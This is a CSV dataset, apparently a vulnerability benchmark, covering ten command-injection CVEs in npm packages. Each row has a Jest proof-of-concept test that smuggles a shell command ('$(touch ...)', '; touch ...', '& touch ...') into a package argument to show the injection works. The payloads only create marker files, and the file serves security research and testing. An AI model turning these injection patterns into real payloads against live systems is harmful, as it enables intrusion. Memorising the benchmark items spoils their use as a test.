Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,CVE-2018-3746,pdfinfojs,0.3.6,0.4.1,command-injection/pdfinfojs_0.3.6,"test(""Command Injection in pdfinfojs"", (done) => {
  expect.assertions(2);
  const pdfinfo = require(""pdfinfojs"");
  const fs = require(""fs"");
  const path = ""./pdfinfojs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  pdf = new pdfinfo(""$(touch pdfinfojs)"");
  pdf.getInfo(function (err, info, params) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/pdfinfo.js:47:23,https://security.snyk.io/vuln/npm:pdfinfojs:20180409; https://github.com/advisories/GHSA-3pxp-6963-46r9
command-injection,CVE-2019-10788,find-process,1.4.4,n/a,command-injection/find-process_1.4.4,"test(""Command Injection in find-process"", () => {
  expect.assertions(1);
  const find = require(""find-process"");
  const fs = require(""fs"");
  const path = ""./find-process"";
  const command = ""$(touch find-process)"";
  return find(""pid"", command).then(
    function (list) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    },
    function (err) {
      console.log(err.stack || err);
    }
  );
});
",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/utils.js:19:8,https://security.snyk.io/vuln/SNYK-JS-FINDPROCESS-1090284; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
command-injection,CVE-2021-23374,ps-visitor,0.0.2,n/a,command-injection/ps-visitor_0.0.2,"test(""Command Injection in ps-visitor"", () => {
  expect.assertions(2);
  const ps_visitor = require(""ps-visitor"");
  const fs = require(""fs"");
  const path = ""./ps-visitor"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ps_visitor.kill(""$(touch ps-visitor)"").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",n/a,index.js:404:10,https://security.snyk.io/vuln/SNYK-JS-PSVISITOR-1078544; https://github.com/advisories/GHSA-v2jv-33gh-xx29
command-injection,CVE-2021-21412,@thi.ng/egf,0.3.0,0.4.0,command-injection/thi.ng-egf_0.3.0,"test(""Command Injection in @thi.ng/egf"", () => {
  expect.assertions(2);
  const egf = require(""@thi.ng/egf"");
  const fs = require(""fs"");
  const path = ""./egf"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    egf.BUILTINS.gpg(""foo"", ""bar`touch egf`"", { opts: { decrypt: true } });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/thi-ng/umbrella/commit/88f61656e5f5cfba960013b8133186389efaf243,lib/index.js:157:29,https://security.snyk.io/vuln/SNYK-JS-THINGEGF-1089810; https://github.com/advisories/GHSA-rj44-gpjc-29r7
command-injection,CVE-2020-28494,total.js,3.4.6,3.4.7,command-injection/total.js_3.4.6,"test(""Command Injection in total.js"", (done) => {
  expect.assertions(2);
  const total = require(""total.js"");
  const fs = require(""fs"");
  const path = ""./total_js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = Image.load("""");
  let payload = "";touch total_js;"";
  var timetaken = ""Time taken by addCount function"";
  console.time(timetaken);
  image.stream(payload);
  console.timeEnd(timetaken);
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 1000);
});
",https://github.com/totaljs/framework/commit/6192491ab2631e7c1d317c221f18ea613e2c18a5,image.js:329:12,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046672; https://github.com/advisories/GHSA-4449-hg37-77v8
command-injection,CVE-2020-7613,clamscan,1.2.0,1.3.0,command-injection/clamscan_1.2.0,"test(""Command Injection in clamscan"", () => {
  expect.assertions(2);
  const Root = require(""clamscan"");
  const fs = require(""fs"");
  const path = ""./clamscan"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var attack_code = ""touch clamscan"";
  var root = new Root();
  fs.mkdir(attack_code + ""&"", function () {});
  return root
    .init({ clamscan: { path: attack_code + ""&"" } })
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/kylefarris/clamscan/commit/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,index.js:495:36,https://security.snyk.io/vuln/SNYK-JS-CLAMSCAN-564113; 
command-injection,CVE-2020-7635,compass-compile,0.0.1,n/a,command-injection/compass-compile_0.0.1,"test(""Command Injection in compass-compile"", () => {
  expect.assertions(2);
  const Root = require(""compass-compile"");
  let root = new Root();
  const fs = require(""fs"");
  const path = ""./compass-compile"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = { compassCommand: ""touch compass-compile"" };
  return root
    .compile(options)
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,lib/compass.js:25:5,https://security.snyk.io/vuln/SNYK-JS-COMPASSCOMPILE-564429; https://github.com/advisories/GHSA-7q9f-x6rm-qmxr
command-injection,CVE-2018-16462,diskstats,0.0.2,2.0.1,command-injection/diskstats_0.0.2,"test(""Command Injection in diskstats"", (done) => {
  expect.assertions(2);
  const diskstats = require(""diskstats"");
  const fs = require(""fs"");
  const path = ""./diskstats"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  diskstats.check(""; touch diskstats"", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,lib/stat.js:44:22,https://security.snyk.io/vuln/SNYK-JS-DISKSTATS-590099; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2019-10789,curling,0.2.0,1.1.0,command-injection/curling_0.2.0,"test(""Command Injection in curling"", (done) => {
  expect.assertions(2);
  const root = require(""curling"");
  const fs = require(""fs"");
  const path = ""./curling"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root.run(""& touch curling"", function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
      done();
    }
  });
});
",n/a,lib/curl-transport.js:56:3,https://security.snyk.io/vuln/SNYK-JS-CURLING-546484; https://github.com/advisories/GHSA-xmxh-g7wj-8m4m
command-injection,CVE-2020-7633,apiconnect-cli-plugins,6.0.2,n/a,command-injection/apiconnect-cli-plugins_6.0.2,"test(""Command Injection in apiconnect-cli-plugins"", () => {
  expect.assertions(2);
  const root = require(""apiconnect-cli-plugins"");
  const fs = require(""fs"");
  const path = ""./apiconnect-cli-plugins"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let payload = ""& touch apiconnect-cli-plugins &"";
  return root.pluginLoader.installPlugin(payload, """").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,lib/plugin-loader.js:181:18,https://security.snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427; 
